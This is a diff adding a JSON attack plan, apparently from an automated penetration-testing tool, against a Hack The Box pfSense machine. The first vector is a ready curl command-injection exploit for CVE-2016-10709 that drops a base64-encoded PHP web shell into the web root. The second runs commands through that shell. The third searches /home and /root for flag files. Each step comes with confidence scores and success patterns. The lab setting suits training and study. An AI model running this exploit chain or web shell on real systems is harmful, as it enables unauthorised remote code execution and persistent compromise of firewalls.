@@ -1,0 +1,127 @@
+{
+  "plan_id": "plan_20241218_001",
+  "target_ip": "10.129.1.221",
+  "context_hash": "pfsense_1435_lighttpd_freebsd_weak",
+  "attack_vectors": [
+    {
+      "vector_id": "vec_01",
+      "priority": 1,
+      "action": {
+        "tool_name": "exploit_runner",
+        "command_template": "curl -k 'https://{target}/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+\"{base64_payload}\">shell.php'",
+        "parameters": {
+          "target": "10.129.1.221",
+          "base64_payload": "PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTs/Pg=="
+        },
+        "timeout_seconds": 30
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "RCE",
+          "mitre_id": "T1190",
+          "cve_id": "CVE-2016-10709"
+        },
+        "hypothesis": {
+          "confidence_score": 0.85,
+          "rationale_tags": [
+            "pfsense_1.4.35",
+            "command_injection",
+            "manual_bypass"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "http_status",
+          "match_pattern": "200",
+          "negative_pattern": "(404|403|500|error)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+",
+        "insight": "Public exploits 38 and 39709 for pfSense fail due to strict filtering - manual exploitation required",
+        "exploitation_logic": "Base64 encoding bypasses filtering mechanisms in pfSense command injection vulnerability",
+        "vulnerability_context": "pfSense 1.4.35 contains RCE via command injection in status_rrd_graph_img.php database parameter",
+        "source": "htb_sense1_writeup"
+      }
+    },
+    {
+      "vector_id": "vec_02",
+      "priority": 2,
+      "action": {
+        "tool_name": "exploit_runner",
+        "command_template": "curl -k 'https://{target}/shell.php?cmd=id'",
+        "parameters": {
+          "target": "10.129.1.221"
+        },
+        "timeout_seconds": 15
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "Command_Execution",
+          "mitre_id": "T1059",
+          "cve_id": "CVE-2016-10709"
+        },
+        "hypothesis": {
+          "confidence_score": 0.9,
+          "rationale_tags": [
+            "webshell_execution",
+            "rce_confirmation"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "regex_match",
+          "match_pattern": "(uid=|root|www)",
+          "negative_pattern": "(not found|error|denied)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "Access created writeup.php file with cmd parameter to execute commands",
+        "insight": "Successful exploitation creates PHP webshell accessible via cmd parameter",
+        "exploitation_logic": "Command execution through injected PHP shell bypasses all pfSense filtering",
+        "vulnerability_context": "Webshell provides persistent command execution capability on pfSense firewall",
+        "source": "htb_sense1_writeup"
+      }
+    },
+    {
+      "vector_id": "vec_03",
+      "priority": 3,
+      "action": {
+        "tool_name": "exploit_runner",
+        "command_template": "curl -k 'https://{target}/shell.php?cmd=find+/home+/root+-name+\"*.txt\"+-type+f+2>/dev/null'",
+        "parameters": {
+          "target": "10.129.1.221"
+        },
+        "timeout_seconds": 20
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "Data_Exfiltration",
+          "mitre_id": "T1083",
+          "cve_id": "CVE-2016-10709"
+        },
+        "hypothesis": {
+          "confidence_score": 0.75,
+          "rationale_tags": [
+            "flag_enumeration",
+            "file_discovery"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "regex_match",
+          "match_pattern": "(/home/|/root/|user\\.txt|root\\.txt)",
+          "negative_pattern": "(permission denied|not found)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "Retrieve flags from /home/{{USER}} and /{{USER}}/{{USER}}.txt",
+        "insight": "pfSense firewall contains user and root flags in standard locations",
+        "exploitation_logic": "File enumeration through webshell identifies flag locations for data extraction",
+        "vulnerability_context": "Compromised firewall provides access to sensitive system files and credentials",
+        "source": "htb_sense1_writeup"
+      }
+    }
+  ],
+  "created_at": "2024-12-18T10:30:00Z"
+}
